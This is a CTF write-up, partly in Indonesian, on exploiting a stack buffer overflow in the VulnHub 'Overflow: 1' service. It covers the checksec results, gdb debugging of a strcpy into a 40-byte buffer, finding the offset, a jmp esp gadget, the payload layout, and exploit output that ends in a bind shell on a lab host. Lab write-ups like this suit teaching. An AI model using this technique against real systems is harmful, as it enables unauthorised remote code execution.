lets start with checksec :
```bash
CANARY    : disabled <--- w0p, classical bof
FORTIFY   : disabled
NX        : disabled <--- shellcode injection today :)
PIE       : disabled
RELRO     : Partial
```

interesting string "OVERFLOW " on *0x0804947f*

breakpoint setelah recv => *0x08049470*<br>
jne jika inputan tidak pas => *0x8049490*<br>
|<br>
|> strncmp(args_1, args_2, size_t)<br>
<br>
size_t = 0x9<br>
args_2 = input kita<br>
args_1 = "OVERFLOW "<br>
<br>
jadi args_1 harus disertakan dalam payload.<br>
<br>
<pre>
breakpoint setelah melalui strncmp => 0x0804949b
selanjutnya diteruskan menuju fungsi handleCommand => 0x08049262
|
|> pada 0x08049279, dilakukan evaluasi buffer sebanyak 40 byte
---> lea    edx,[ebp-0x28] # 0x28 = 40
|> lalu pada 0x0804927f diprosess melalui strcpy ... u kn0w what i mean :v
\\> info from pwn tips!
 \\ * `strcpy(buf, buf2)`
    * No boundary check.
    * It copies the content of buf2(until reaching NULL byte) which may be longer than `length(buf)` to buf.
    * Therefore, it may happen overflow.
    * **pwnable**
</pre>
lets test the overflow<br>
payload = "OVERFLOW "+"A"*40<br>
|<br>
|> B0oom, overflow => 0x41414141<br>
<br>
selanjutnya, mencari offset :
<pre>
payload = 'OVERFLOW '+random_pattern
#terminal 1 : (nc localhost 1337)
COMMAND : OVERFLOW AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa
#terminal 2 : (gdb)
Invalid $PC address: 0x41414541
gdb-peda$ patto 0x41414541
1094796609 found at offset: 35 <--- f00l
</pre>

saat di lihat kembali, terdapat 2 fungsi tambahan :<br>
1.) handleCommand <--- bof<br>
2.) jmpesp <--- what is this ?<br>
<br>
saat di-disassembly ternyata ia menambah sekitar 11627 byte ke register eax<br>
```bash
gdb-peda$ pdisass jmpesp
Dump of assembler code for function jmpesp:
   0x0804928d <+0>:	push   ebp
   0x0804928e <+1>:	mov    ebp,esp
   0x08049290 <+3>:	call   0x80494dc <__x86.get_pc_thunk.ax>
   0x08049295 <+8>:	add    eax,0x2d6b   <--- yummy
   0x0804929a <+13>:	jmp    esp
   0x0804929c <+15>:	nop
   0x0804929d <+16>:	pop    ebp
   0x0804929e <+17>:	ret    
End of assembler dump.
```
<br>
Jadi untuk exploit pola ialah :<br>
>"OVERFLOW " + offset + jmpesp_address + nop*10 + shellcode<br>

**Finger Cross!**

```bash
~/alam-gaib/santet/ctf-writeups/VulnHub/Overflow: 1(master*) » python exploit.py                                                        muwa00@parrot
[+] Opening connection to 10.42.0.2 on port 1337: Done
[*] Crafting payload ...
[*] Send to 10.42.0.2:1337
[*] Closed connection to 10.42.0.2 port 1337
[*] Checking bind shell
[+] Opening connection to 10.42.0.2 on port 11111: Done
[*] Found, access the shell
[*] Switching to interactive mode
$ whoami
user
$
```

** b00m **  
